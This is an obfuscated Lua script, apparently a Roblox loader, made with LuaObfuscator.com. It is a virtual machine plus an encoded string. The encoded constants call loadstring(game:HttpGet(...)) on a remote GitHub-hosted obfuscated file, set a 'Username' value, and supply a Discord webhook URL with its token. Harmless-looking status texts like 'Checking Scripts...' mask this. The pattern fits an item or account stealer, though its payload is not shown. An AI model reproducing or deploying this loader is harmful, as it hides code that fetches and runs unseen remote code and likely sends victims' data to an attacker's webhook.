--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.4) ~  Much Love, Ferib 

]]--

do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 1;
		local v19;
		v16 = v4(v3(v16, 5), "..", function(v20)
			if (v1(v20, 2) == 79) then
				v19 = v0(v3(v20, 1, 1));
				return "";
			else
				local v70 = v2(v0(v20, 16));
				if v19 then
					local v81 = 0;
					local v82;
					while true do
						if (v81 == 1) then
							return v82;
						end
						if (v81 == 0) then
							v82 = v5(v70, v19);
							v19 = nil;
							v81 = 1;
						end
					end
				else
					return v70;
				end
			end
		end);
		local function v21(v22, v23, v24)
			if v24 then
				local v71 = (v22 / (((664 + 770) - (784 + (1318 - 670))) ^ (v23 - 1))) % ((1 + 1) ^ (((v24 - (1 + 0)) - (v23 - (2 - 1))) + (1040 - (519 + (1575 - (600 + 455))))));
				return v71 - (v71 % (1142 - (726 + 415)));
			else
				local v72 = 0 + 0;
				local v73;
				while true do
					if (v72 == (0 - 0)) then
						v73 = 2 ^ (v23 - (1003 - (369 + 452 + 181)));
						return (((v22 % (v73 + v73)) >= v73) and (2 - 1)) or (0 + 0);
					end
				end
			end
		end
		local function v25()
			local v38 = 0;
			local v39;
			while true do
				if ((1 + 0) == v38) then
					return v39;
				end
				if (v38 == (1067 - (58 + 1009))) then
					v39 = v1(v16, v18, v18);
					v18 = v18 + (2 - (920 - (314 + 605)));
					v38 = 1;
				end
			end
		end
		local function v26()
			local v40, v41 = v1(v16, v18, v18 + (6 - 4));
			v18 = v18 + 2;
			return (v41 * (109 + 147)) + v40;
		end
		local function v27()
			local v42 = 0;
			local v43;
			local v44;
			local v45;
			local v46;
			while true do
				if (v42 == (0 - 0)) then
					v43, v44, v45, v46 = v1(v16, v18, v18 + 3);
					v18 = v18 + ((426 - (350 + 66)) - 6);
					v42 = 1 + 0;
				end
				if (1 == v42) then
					return (v46 * (38173229 - 21396013)) + (v45 * (65887 - (213 + 138))) + (v44 * (190 + 66)) + v43;
				end
			end
		end
		local function v28()
			local v47 = 0 - (0 - 0);
			local v48;
			local v49;
			local v50;
			local v51;
			local v52;
			local v53;
			while true do
				if (v47 == (558 - (342 + 216))) then
					v48 = v27();
					v49 = v27();
					v47 = 2 - 1;
				end
				if (v47 == (186 - (133 + 51))) then
					v52 = v21(v49, 21, 1200 - (438 + (1535 - 804)));
					v53 = ((v21(v49, 6 + 26) == (1004 - (447 + (1142 - 586)))) and -(1636 - (622 + 1013))) or (2 - 1);
					v47 = 1900 - (1025 + 872);
				end
				if (v47 == (2 + 1)) then
					if (v52 == 0) then
						if (v51 == (0 - 0)) then
							return v53 * 0;
						else
							local v95 = 0 - 0;
							while true do
								if (v95 == ((740 - (224 + 231)) - (178 + 107))) then
									v52 = 1;
									v50 = 442 - (188 + 254);
									break;
								end
							end
						end
					elseif (v52 == (1382 + 665)) then
						return ((v51 == (0 + 0)) and (v53 * ((1994 - (529 + 1464)) / (0 + 0)))) or (v53 * NaN);
					end
					return v8(v53, v52 - (2293 - 1270)) * (v50 + (v51 / (((924 - 565) - (192 + 165)) ^ (493 - (388 + 53)))));
				end
				if (1 == v47) then
					v50 = 472 - (11 + 460);
					v51 = (v21(v49, 627 - (450 + 176), (194 + 212) - (32 + 354)) * ((5 - 3) ^ 32)) + v48;
					v47 = 2;
				end
			end
		end
		local function v29(v30)
			local v54 = 0 - 0;
			local v55;
			local v56;
			while true do
				if (v54 == (1173 - (1008 + (358 - 195)))) then
					v56 = {};
					for v83 = 1 + 0, #v55 do
						v56[v83] = v2(v1(v3(v55, v83, v83)));
					end
					v54 = 1 + 2;
				end
				if (v54 == (0 + 0)) then
					v55 = nil;
					if not v30 then
						local v91 = 1466 - (1337 + 129);
						while true do
							if (v91 == (0 - 0)) then
								v30 = v27();
								if (v30 == (580 - (270 + 88 + 222))) then
									return "";
								end
								break;
							end
						end
					end
					v54 = 1;
				end
				if (((2350 - 1226) - (244 + 877)) == v54) then
					return v6(v56);
				end
				if (v54 == (792 - (145 + 646))) then
					v55 = v3(v16, v18, (v18 + v30) - 1);
					v18 = v18 + v30;
					v54 = 575 - (540 + 33);
				end
			end
		end
		local v31 = v27;
		local function v32(...)
			return {...}, v12("#", ...);
		end
		local function v33()
			local v57 = 0 + 0;
			local v58;
			local v59;
			local v60;
			local v61;
			local v62;
			local v63;
			local v64;
			local v65;
			while true do
				if (v57 == (2 - 0)) then
					local v74 = 1346 - (1267 + 79);
					while true do
						if (v74 ~= (536 - (173 + 362))) then
						else
							v57 = 7 - 4;
							break;
						end
						if (v74 ~= 0) then
						else
							v62 = nil;
							v63 = nil;
							v74 = 1 + 0;
						end
					end
				end
				if (v57 ~= (8 - 4)) then
				else
					while true do
						if ((1 + 0) == v58) then
							local v92 = 0;
							while true do
								if (v92 ~= 1) then
								else
									v58 = 893 - (543 + 348);
									break;
								end
								if (v92 == (769 - (177 + 592))) then
									v61 = nil;
									v62 = nil;
									v92 = 1;
								end
							end
						end
						if (v58 == (258 - (69 + 187))) then
							local v93 = 0 - 0;
							while true do
								if (v93 == 1) then
									v58 = 219 - (188 + 28);
									break;
								end
								if (v93 == (510 - (47 + 463))) then
									v63 = nil;
									v64 = nil;
									v93 = 11 - (7 + 3);
								end
							end
						end
						if (v58 ~= (0 - 0)) then
						else
							local v94 = 0;
							while true do
								if (v94 == 1) then
									v58 = 1412 - (692 + 719);
									break;
								end
								if (v94 == (0 + 0)) then
									local v108 = 0;
									while true do
										if (v108 == (1 + 0)) then
											v94 = 1 + 0;
											break;
										end
										if (v108 ~= 0) then
										else
											v59 = 0;
											v60 = nil;
											v108 = 1;
										end
									end
								end
							end
						end
						if (v58 ~= 3) then
						else
							v65 = nil;
							while true do
								local v96 = 1332 - (1205 + 127);
								local v97;
								while true do
									if (v96 == 0) then
										v97 = 0 + 0;
										while true do
											if ((1921 - (877 + 1044)) ~= v97) then
											else
												local v119 = 0;
												local v120;
												while true do
													if (v119 ~= 0) then
													else
														v120 = 0;
														while true do
															if (v120 == 1) then
																v97 = 1 - 0;
																break;
															end
															if (v120 ~= (670 - (123 + 547))) then
															else
																local v124 = 1012 - (386 + 626);
																while true do
																	if (v124 == (1073 - (47 + 1025))) then
																		v120 = 1 + 0;
																		break;
																	end
																	if (v124 == 0) then
																		if (v59 == 1) then
																			local v129 = 0;
																			local v130;
																			while true do
																				if (v129 ~= (1510 - (369 + 1141))) then
																				else
																					v130 = 155 - (19 + 136);
																					while true do
																						if (v130 ~= (1 + 0)) then
																						else
																							local v162 = 0;
																							local v163;
																							while true do
																								if ((1891 - (1004 + 887)) == v162) then
																									v163 = 0;
																									while true do
																										if (v163 ~= (0 + 0)) then
																										else
																											for v182 = 1 + 0, v64 do
																												local v183 = 0 - 0;
																												local v184;
																												local v185;
																												local v186;
																												local v187;
																												local v188;
																												while true do
																													if (v183 ~= 1) then
																													else
																														v186 = nil;
																														v187 = nil;
																														v183 = 2;
																													end
																													if (v183 ~= (1116 - (293 + 821))) then
																													else
																														v188 = nil;
																														while true do
																															if (v184 ~= (0 - 0)) then
																															else
																																local v197 = 0;
																																while true do
																																	if (v197 ~= (2 - 1)) then
																																	else
																																		v184 = 1561 - (1050 + 510);
																																		break;
																																	end
																																	if (0 ~= v197) then
																																	else
																																		v185 = 0;
																																		v186 = nil;
																																		v197 = 1;
																																	end
																																end
																															end
																															if (v184 ~= (4 - 2)) then
																															else
																																while true do
																																	if ((0 + 0) ~= v185) then
																																	else
																																		local v200 = 0;
																																		while true do
																																			if (v200 ~= (1224 - (361 + 862))) then
																																			else
																																				v185 = 2 - 1;
																																				break;
																																			end
																																			if (v200 == 0) then
																																				v186 = 0;
																																				v187 = nil;
																																				v200 = 4 - 3;
																																			end
																																		end
																																	end
																																	if (v185 ~= 1) then
																																	else
																																		v188 = nil;
																																		while true do
																																			if (v186 == (0 + 0)) then
																																				local v208 = 0 - 0;
																																				local v209;
																																				while true do
																																					if (v208 == 0) then
																																						v209 = 1494 - (825 + 669);
																																						while true do
																																							if (1 == v209) then
																																								v186 = 1216 - (85 + 1130);
																																								break;
																																							end
																																							if (v209 == (373 - (101 + 272))) then
																																								local v212 = 0 - 0;
																																								while true do
																																									if (v212 ~= (1544 - (427 + 1117))) then
																																									else
																																										v187 = v25();
																																										v188 = nil;
																																										v212 = 864 - (428 + 435);
																																									end
																																									if (v212 ~= 1) then
																																									else
																																										v209 = 100 - (69 + 30);
																																										break;
																																									end
																																								end
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			if (v186 == (823 - (15 + 807))) then
																																				if (v187 == (1 + 0)) then
																																					v188 = v25() ~= (0 + 0);
																																				elseif (v187 == (1901 - (280 + 1619))) then
																																					v188 = v28();
																																				elseif (v187 == (8 - 5)) then
																																					v188 = v29();
																																				end
																																				v65[v182] = v188;
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v184 == (2 - 1)) then
																																v187 = nil;
																																v188 = nil;
																																v184 = 2;
																															end
																														end
																														break;
																													end
																													if (v183 == 0) then
																														v184 = 532 - (402 + 130);
																														v185 = nil;
																														v183 = 1;
																													end
																												end
																											end
																											v63[3] = v25();
																											v163 = 1;
																										end
																										if (v163 ~= (4 - 3)) then
																										else
																											v130 = 2 - 0;
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																						if ((0 + 0) == v130) then
																							local v164 = 0;
																							while true do
																								if (v164 == 0) then
																									v64 = v27();
																									v65 = {};
																									v164 = 1;
																								end
																								if (v164 ~= (1181 - (500 + 680))) then
																								else
																									v130 = 1;
																									break;
																								end
																							end
																						end
																						if (v130 == (1321 - (536 + 783))) then
																							v59 = 2;
																							break;
																						end
																					end
																					break;
																				end
																			end
																		end
																		if (v59 == 2) then
																			local v131 = 0;
																			local v132;
																			while true do
																				if (v131 ~= (0 - 0)) then
																				else
																					v132 = 1796 - (225 + 1571);
																					while true do
																						local v157 = 0;
																						local v158;
																						while true do
																							if (v157 ~= (0 - 0)) then
																							else
																								v158 = 590 - (501 + 89);
																								while true do
																									if ((0 + 0) == v158) then
																										if (v132 ~= 1) then
																										else
																											local v179 = 0 + 0;
																											while true do
																												if (v179 == 0) then
																													local v192 = 202 - (9 + 193);
																													while true do
																														if (v192 == 0) then
																															for v198 = 952 - (179 + 772), v27() do
																																v62[v198] = v27();
																															end
																															return v63;
																														end
																													end
																												end
																											end
																										end
																										if (v132 ~= (0 + 0)) then
																										else
																											local v180 = 0;
																											local v181;
																											while true do
																												if (0 ~= v180) then
																												else
																													v181 = 0;
																													while true do
																														if (v181 == 1) then
																															v132 = 1 - 0;
																															break;
																														end
																														if (v181 == 0) then
																															local v196 = 0;
																															while true do
																																if ((145 - (26 + 119)) ~= v196) then
																																else
																																	for v201 = 1 - 0, v27() do
																																		local v202 = 0;
																																		local v203;
																																		local v204;
																																		local v205;
																																		while true do
																																			if (v202 == (0 - 0)) then
																																				v203 = 0 - 0;
																																				v204 = nil;
																																				v202 = 1;
																																			end
																																			if (v202 == (1 + 0)) then
																																				v205 = nil;
																																				while true do
																																					if (v203 == (0 - 0)) then
																																						local v211 = 0;
																																						while true do
																																							if (v211 ~= 1) then
																																							else
																																								v203 = 1;
																																								break;
																																							end
																																							if (v211 == 0) then
																																								v204 = 0 - 0;
																																								v205 = nil;
																																								v211 = 1 - 0;
																																							end
																																						end
																																					end
																																					if ((1 - 0) == v203) then
																																						while true do
																																							if ((0 - 0) == v204) then
																																								v205 = v25();
																																								if (v21(v205, 1 + 0, 1438 - (1285 + 152)) ~= (0 + 0)) then
																																								else
																																									local v213 = 0 - 0;
																																									local v214;
																																									local v215;
																																									local v216;
																																									while true do
																																										if ((1 - 0) ~= v213) then
																																										else
																																											local v217 = 0 + 0;
																																											while true do
																																												if (v217 ~= 0) then
																																												else
																																													local v223 = 0;
																																													while true do
																																														if (v223 ~= (0 - 0)) then
																																														else
																																															v216 = {v26(),v26(),nil,nil};
																																															if (v214 == (0 + 0)) then
																																																local v225 = 0;
																																																local v226;
																																																while true do
																																																	if (v225 == 0) then
																																																		v226 = 0;
																																																		while true do
																																																			if (v226 ~= (971 - (698 + 273))) then
																																																			else
																																																				v216[831 - (658 + 170)] = v26();
																																																				v216[8 - 4] = v26();
																																																				break;
																																																			end
																																																		end
																																																		break;
																																																	end
																																																end
																																															elseif (v214 == (1347 - (896 + 450))) then
																																																v216[3] = v27();
																																															elseif (v214 == (7 - 5)) then
																																																v216[3] = v27() - ((2 - 0) ^ (71 - 55));
																																															elseif (v214 ~= (2 + 1)) then
																																															else
																																																local v235 = 0;
																																																while true do
																																																	if (v235 ~= (0 + 0)) then
																																																	else
																																																		v216[3] = v27() - ((1 + 1) ^ (62 - 46));
																																																		v216[1023 - (744 + 275)] = v26();
																																																		break;
																																																	end
																																																end
																																															end
																																															v223 = 1;
																																														end
																																														if ((551 - (212 + 338)) ~= v223) then
																																														else
																																															v217 = 2 - 1;
																																															break;
																																														end
																																													end
																																												end
																																												if (v217 ~= 1) then
																																												else
																																													v213 = 2;
																																													break;
																																												end
																																											end
																																										end
																																										if (v213 == (2 - 0)) then
																																											local v218 = 0 + 0;
																																											while true do
																																												if (1 ~= v218) then
																																												else
																																													v213 = 2 + 1;
																																													break;
																																												end
																																												if (0 ~= v218) then
																																												else
																																													local v224 = 1027 - (181 + 846);
																																													while true do
																																														if (1 ~= v224) then
																																														else
																																															v218 = 1;
																																															break;
																																														end
																																														if (v224 == 0) then
																																															if (v21(v215, 1, 1) == 1) then
																																																v216[6 - 4] = v65[v216[1053 - (447 + 604)]];
																																															end
																																															if (v21(v215, 1 + 1, 2) ~= 1) then
																																															else
																																																v216[360 - (297 + 60)] = v65[v216[8 - 5]];
																																															end
																																															v224 = 1 - 0;
																																														end
																																													end
																																												end
																																											end
																																										end
																																										if (v213 == (1784 - (1720 + 64))) then
																																											local v219 = 1952 - (1687 + 265);
																																											while true do
																																												if (v219 ~= 1) then
																																												else
																																													v213 = 1;
																																													break;
																																												end
																																												if (v219 == (0 + 0)) then
																																													v214 = v21(v205, 2, 1 + 2);
																																													v215 = v21(v205, 1909 - (1863 + 42), 6);
																																													v219 = 1 + 0;
																																												end
																																											end
																																										end
																																										if (v213 ~= (2 + 1)) then
																																										else
																																											if (v21(v215, 670 - (627 + 40), 1602 - (191 + 1408)) == 1) then
																																												v216[4] = v65[v216[4]];
																																											end
																																											v60[v201] = v216;
																																											break;
																																										end
																																									end
																																								end
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	for v206 = 1, v27() do
																																		v61[v206 - 1] = v33();
																																	end
																																	v196 = 1 + 0;
																																end
																																if (v196 == (1199 - (401 + 797))) then
																																	v181 = 1 - 0;
																																	break;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					break;
																				end
																			end
																		end
																		v124 = 1;
																	end
																end
															end
														end
														break;
													end
												end
											end
											if (v97 == (1 - 0)) then
												if ((0 - 0) == v59) then
													local v121 = 0;
													local v122;
													while true do
														if (v121 == (0 + 0)) then
															v122 = 0;
															while true do
																if (v122 == (1938 - (757 + 1181))) then
																	local v125 = 0;
																	while true do
																		if (v125 ~= 1) then
																		else
																			v122 = 1 + 0;
																			break;
																		end
																		if (v125 == (0 - 0)) then
																			v60 = {};
																			v61 = {};
																			v125 = 2 - 1;
																		end
																	end
																end
																if (v122 == (1967 - (1036 + 930))) then
																	local v126 = 0;
																	while true do
																		if (v126 ~= (1 + 0)) then
																		else
																			v122 = 6 - 4;
																			break;
																		end
																		if ((0 - 0) == v126) then
																			v62 = {};
																			v63 = {v60,v61,nil,v62};
																			v126 = 1;
																		end
																	end
																end
																if (v122 ~= 2) then
																else
																	v59 = 1 + 0;
																	break;
																end
															end
															break;
														end
													end
												end
												break;
											end
										end
										break;
									end
								end
							end
							break;
						end
					end
					break;
				end
				if (0 == v57) then
					local v75 = 1866 - (1462 + 404);
					while true do
						if (v75 == (0 - 0)) then
							v58 = 0;
							v59 = nil;
							v75 = 1;
						end
						if (v75 ~= (1615 - (1200 + 414))) then
						else
							v57 = 1;
							break;
						end
					end
				end
				if (v57 == 3) then
					local v76 = 0;
					while true do
						if (v76 ~= (322 - (224 + 97))) then
						else
							v57 = 16 - 12;
							break;
						end
						if (v76 == 0) then
							v64 = nil;
							v65 = nil;
							v76 = 1 + 0;
						end
					end
				end
				if (1 == v57) then
					local v77 = 0;
					while true do
						if (v77 == 0) then
							v60 = nil;
							v61 = nil;
							v77 = 553 - (532 + 20);
						end
						if (v77 ~= 1) then
						else
							v57 = 1 + 1;
							break;
						end
					end
				end
			end
		end
		local function v34(v35, v36, v37)
			local v66 = 0;
			local v67;
			local v68;
			local v69;
			while true do
				if (v66 == 0) then
					v67 = v35[1];
					v68 = v35[2];
					v66 = 1;
				end
				if (v66 == 1) then
					v69 = v35[3];
					return function(...)
						local v85 = 0;
						local v86;
						local v87;
						local v88;
						local v89;
						local v90;
						while true do
							if (v85 == 1) then
								v88 = {...};
								v89 = v12("#", ...) - 1;
								v85 = 2;
							end
							if (v85 == 2) then
								v90 = nil;
								v90 = function()
									local v98 = v67;
									local v99 = v68;
									local v100 = v69;
									local v101 = v32;
									local v102 = {};
									local v103 = {};
									local v104 = {};
									for v109 = 1860 - (216 + 1644), v89 do
										if ((v109 >= v100) or (((1806 - 627) + 1888) == (11845 - 7913))) then
											v102[v109 - v100] = v88[v109 + (4 - (369 - (279 + 87)))];
										else
											v104[v109] = v88[v109 + (4 - (6 - 3))];
										end
									end
									local v105 = (v89 - v100) + (2 - 1);
									local v106;
									local v107;
									while true do
										local v110 = (2390 - (847 + 290)) - ((2198 - (1237 + 749)) + 1041);
										local v111;
										local v112;
										while true do
											if ((((1980 + 5100) - 3846) >= (4661 - (232 + 1383))) and ((1 + 0) == v110)) then
												while true do
													if ((2898 >= (10 + 6)) and (v111 == (0 - 0))) then
														v112 = 1119 - (257 + 197 + 665);
														while true do
															if ((((179 - 84) + 169) == (1322 - (907 + 151))) and (v112 == 0)) then
																local v123 = 0 + 0;
																while true do
																	if ((919 <= 3779) and (v123 == (4 - 3))) then
																		v112 = 1;
																		break;
																	end
																	if ((((7626 - (301 + 1519)) - ((4252 - 3358) + (315 - (79 + 72)))) == 4748) and (v123 == (0 + 0))) then
																		v106 = v98[v86];
																		v107 = v106[1];
																		v123 = 1;
																	end
																end
															end
															if ((v112 == ((2 - 1) + 0)) or ((5 + 35) > (1159 + 1944))) then
																if (((3581 - (53 + 14)) >= (2 + (46 - 19))) and (v107 <= 5)) then
																	if (((3125 - ((201 - 142) + 13)) == (2370 + 683)) and (v107 <= (2 + 0))) then
																		if (((870 - 493) <= (1854 - (2 + 21 + 66))) and (v107 <= 0)) then
																			v104[v106[1 + 1]]();
																		elseif ((v107 == (907 - (185 + 721))) or ((8136 - 5404) == (5 + 2474))) then
																			local v136 = 0 + 0;
																			local v137;
																			local v138;
																			local v139;
																			while true do
																				if (((1510 + 337) == (3200 - 1353)) and (v136 == ((2030 - (293 + 1114)) - (313 + 310)))) then
																					local v161 = (546 - (139 + 407)) + (0 - 0);
																					while true do
																						if ((1432 == (1195 + 237)) and (v161 == 0)) then
																							v137 = 0;
																							v138 = nil;
																							v161 = 1 + 0;
																						end
																						if (((1627 - (311 + 1222)) < 2331) and (v161 == ((130 - (67 + 60)) - 2))) then
																							v136 = 1 + 0;
																							break;
																						end
																					end
																				end
																				if ((v136 == (1 + 0)) or ((864 + 2925) < (6533 - 4301))) then
																					v139 = nil;
																					while true do
																						if (((1026 + 1177) < (13403 - 9381)) and (v137 == 0)) then
																							local v165 = 0 - 0;
																							while true do
																								if (((9894 - 6028) >= (39 + 22)) and (v165 == 1)) then
																									v137 = 1694 - ((3029 - 2269) + 933);
																									break;
																								end
																								if ((0 == v165) or ((5451 - (798 + 61)) <= 2389)) then
																									local v177 = 0 - (0 - 0);
																									while true do
																										if ((v177 == (401 - (287 + 114))) or (4966 <= (1795 + (1189 - (606 + 337))))) then
																											v138 = v106[6 - 4];
																											v139 = v104[v106[3 + (1798 - (1086 + 712))]];
																											v177 = 1663 - (30 + 1632);
																										end
																										if ((4241 == (3525 + 716)) and (v177 == (1 + (0 - 0)))) then
																											v165 = (90 + 250) - (205 + 134);
																											break;
																										end
																									end
																								end
																							end
																						end
																						if (((4954 - (373 + 233)) == (5954 - (1426 + 180))) and (v137 == (1 - 0))) then
																							v104[v138 + ((428 - (404 + 22)) - 1)] = v139;
																							v104[v138] = v139[v106[1994 - (861 + 1129)]];
																							break;
																						end
																					end
																					break;
																				end
																			end
																		elseif ((v106[(421 + 127) - (20 + 526)] == v104[v106[(214 + 333) - (40 + (2195 - (1040 + 652)))]]) or ((1448 - (54 + 313)) <= (552 + 347))) then
																			v86 = v86 + (1 - 0);
																		else
																			v86 = v106[3 + 0];
																		end
																	elseif ((v107 <= (6 - 3)) or ((2066 - 1268) == ((4690 + 314) - (1523 + (330 - 162))))) then
																		for v134 = v106[1632 - (1326 + 304)], v106[(2376 - (453 + 536)) - (1140 + 244)] do
																			v104[v134] = nil;
																		end
																	elseif ((v107 > (2 + 2)) or (410 > ((4971 - (185 + 1005)) + (593 - 171)))) then
																		if (((9266 - 5190) > (3187 + 178)) and (v104[v106[(1096 - (263 + 826)) - 5]] == v106[1277 - (1003 + 270)])) then
																			v86 = v86 + (1 - 0);
																		else
																			v86 = v106[1214 - (621 + 590)];
																		end
																	else
																		local v140 = 0;
																		local v141;
																		local v142;
																		local v143;
																		local v144;
																		local v145;
																		while true do
																			if ((v140 == (1981 - ((2880 - 1498) + 599))) or (2000 > (2972 + 775))) then
																				v141 = 0 - 0;
																				v142 = nil;
																				v140 = 1;
																			end
																			if (((1 + 0) == v140) or ((2180 + 914) <= ((3773 - 2887) - ((915 - 670) + 397)))) then
																				v143 = nil;
																				v144 = nil;
																				v140 = 2 + (1221 - (1017 + 204));
																			end
																			if ((((4723 - 3491) - (627 + (907 - (592 + 278)))) == (322 + 246)) and (v140 == (4 - 2))) then
																				v145 = nil;
																				while true do
																					if ((((3092 - 1743) - ((1363 - (23 + 87)) + 95)) == v141) or (705 == (644 + 293))) then
																						local v169 = 0;
																						while true do
																							if (((2575 + (1361 - 801)) < (2334 + 1835)) and ((0 + 0) == v169)) then
																								v87 = (v144 + v142) - ((2 + 0) - 1);
																								v145 = 0 - 0;
																								v169 = 1 - (950 - (727 + 223));
																							end
																							if ((v169 == ((1 - 0) - (0 + 0))) or (((6815 - (520 + 1332)) - (1298 + 405)) == 3805)) then
																								v141 = (419 + 1241) - (1001 + 657);
																								break;
																							end
																						end
																					end
																					if ((v141 == (1217 - (358 + 857))) or (4993 < 3164)) then
																						for v174 = v142, v87 do
																							local v175 = 0;
																							local v176;
																							while true do
																								if ((1365 <= (894 + 959)) and (v175 == (1443 - (1414 + 29)))) then
																									v176 = 0 + 0;
																									while true do
																										if (((1355 - (652 + 478)) < (4174 - (214 + 547))) and (v176 == (0 - 0))) then
																											v145 = v145 + 1;
																											v104[v174] = v143[v145];
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																						break;
																					end
																					if ((v141 == 0) or ((5345 - (32 + 479 + 810)) < (1462 - (913 + (625 - 447))))) then
																						local v170 = (0 - 0) - (701 - (509 + 192));
																						local v171;
																						while true do
																							if ((v170 == 0) or (((1924 - 1002) + 1214) <= 581)) then
																								v171 = 0 + 0;
																								while true do
																									if ((1739 >= (50 + 51)) and (v171 == (0 - 0))) then
																										local v191 = (557 - (225 + 5)) - (96 + 231);
																										while true do
																											if (((377 + 3587) == (1011 + 2953)) and (v191 == (996 - (938 + 57)))) then
																												v171 = 1481 - (1387 + 20 + 73);
																												break;
																											end
																											if ((2637 == (3829 - (212 + 265 + 45 + 670))) and (v191 == (0 + 0))) then
																												v142 = v106[579 - (475 + 102)];
																												v143, v144 = v101(v104[v142](v13(v104, v142 + ((1963 - (1796 + 4)) - (122 + 40)), v106[8 - 5])));
																												v191 = 1313 - (354 + 958);
																											end
																										end
																									end
																									if (((10882 - 6469) == (18314 - 13901)) and (v171 == (1549 - (200 + 1348)))) then
																										v141 = 1 + 0 + 0;
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																				end
																				break;
																			end
																		end
																	end
																elseif ((v107 <= 8) or ((7699 - 3172) == (11320 - (19321 - 12774)))) then
																	if ((v107 <= 6) or ((21441 - (16927 - (361 + 87))) < (650 + 982))) then
																		v86 = v106[3];
																	elseif ((v107 == ((698 + 163) - (842 + 12))) or ((5467 - 2103) < (577 + (3504 - (868 + 879))))) then
																		v104[v106[494 - (438 + 54)]][v106[4 - 1]] = v106[205 - (87 + 114)];
																	else
																		v104[v106[2 + 0]] = v106[3];
																	end
																elseif ((v107 <= (1447 - ((161 - 126) + 1402))) or ((2437 - (110 + 72)) <= (6862 - 5085))) then
																	if ((v107 > 9) or (((3155 - (56 + 4)) - (832 + 813)) >= (5076 - (97 + 1823)))) then
																		v37[v106[1297 - (291 + 1003)]] = v104[v106[1 + 1]];
																	else
																		local v152 = 0 + 0;
																		local v153;
																		local v154;
																		while true do
																			if (((3387 - 2275) < 4067) and (v152 == (0 - 0))) then
																				v153 = 0 + 0 + 0;
																				v154 = nil;
																				v152 = 3 - 2;
																			end
																			if ((v152 == 1) or ((666 + 1491) > (4722 - (55 + 126)))) then
																				while true do
																					if (((809 + 1458) < (2674 + 831)) and (v153 == (0 - 0))) then
																						v154 = v106[2 + 0];
																						v104[v154] = v104[v154](v13(v104, v154 + (1 - 0), v87));
																						break;
																					end
																				end
																				break;
																			end
																		end
																	end
																elseif ((v107 == (11 + 0)) or ((6542 - 2574) <= 2038)) then
																	v104[v106[(3 - 1) + 0]] = v37[v106[2 + (1645 - (1122 + 522))]];
																else
																	do
																		return;
																	end
																end
																v86 = v86 + (2 - 1);
																break;
															end
														end
														break;
													end
												end
												break;
											end
											if ((v110 == (237 - (207 + 30))) or ((4197 - (1047 + 176)) >= (2525 + 1632))) then
												v111 = 0 + 0;
												v112 = nil;
												v110 = 1 - 0;
											end
										end
									end
								end;
								v85 = 3;
							end
							if (v85 == 0) then
								v86 = 1;
								v87 = -1;
								v85 = 1;
							end
							if (v85 == 3) then
								A, B = v32(v11(v90));
								if not A[1] then
									local v113 = 0;
									local v114;
									while true do
										if (0 == v113) then
											v114 = v35[4][v86] or "?";
											error("Script error at [" .. v114 .. "]:" .. A[2]);
											break;
										end
									end
								else
									return v13(A, 2, B);
								end
								break;
							end
						end
					end;
				end
			end
		end
		return v34(v33(), {}, v17)(...);
	end
	v15("LOL!173O00028O00026O00084003023O005F4703053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403803O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F50726F776C6E2O6F6247542F647764772F6D61696E2F6F62665F4E596935426858313234362O3135346B3738366A3530363831386B3966354739437630743744496F39304F5365475531585A6F38374B2O5866725A794E624F6E2E6C7561026O00F03F03103O00437573746F6D5363726970744E616D6503093O00536861646F7756626703053O00546578743103103O00536372697074204C6F616465643O2E027O004003083O00557365726E616D65030C3O003430345F64656D6F6E32313303073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313037363130393237343336383937303735322F5265356D4A4236486E336A4D414D69645A554F786E4E67647731614B2D70617A466C79694E6F63676E557A66516F3859765363614C7533307037574131364E386D774A4203053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E00423O0012083O00014O0003000100013O0026053O0002000100010004063O00020001001208000100013O00260500010011000100020004063O0011000100120B000200033O00300700020004000500120B000200063O00120B000300073O002001000300030008001208000500094O0004000300054O000900023O00024O0002000100010004063O00410001002605000100200001000A0004063O00200001001208000200013O0026050002001B000100010004063O001B000100120B000300033O0030070003000B000C00120B000300033O0030070003000D000E0012080002000A3O002605000200140001000A0004063O001400010012080001000F3O0004063O002000010004063O001400010026050001002F000100010004063O002F0001001208000200013O002605000200270001000A0004063O002700010012080001000A3O0004063O002F000100260500020023000100010004063O00230001001208000300113O00120A000300103O001208000300133O00120A000300123O0012080002000A3O0004063O00230001002605000100050001000F0004063O00050001001208000200013O000E02000A0036000100020004063O00360001001208000100023O0004063O0005000100260500020032000100010004063O0032000100120B000300033O00300700030014001500120B000300033O0030070003001600170012080002000A3O0004063O003200010004063O000500010004063O004100010004063O000200012O000C3O00017O00423O00023O00033O00053O00053O00063O00083O00083O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000D3O000D3O000E3O00103O00103O00113O00113O00123O00123O00133O00153O00153O00163O00173O00183O001B3O001B3O001C3O001E3O001E3O001F3O00203O00223O00223O00233O00233O00243O00243O00253O00263O00293O00293O002A3O002C3O002C3O002D3O002E3O00303O00303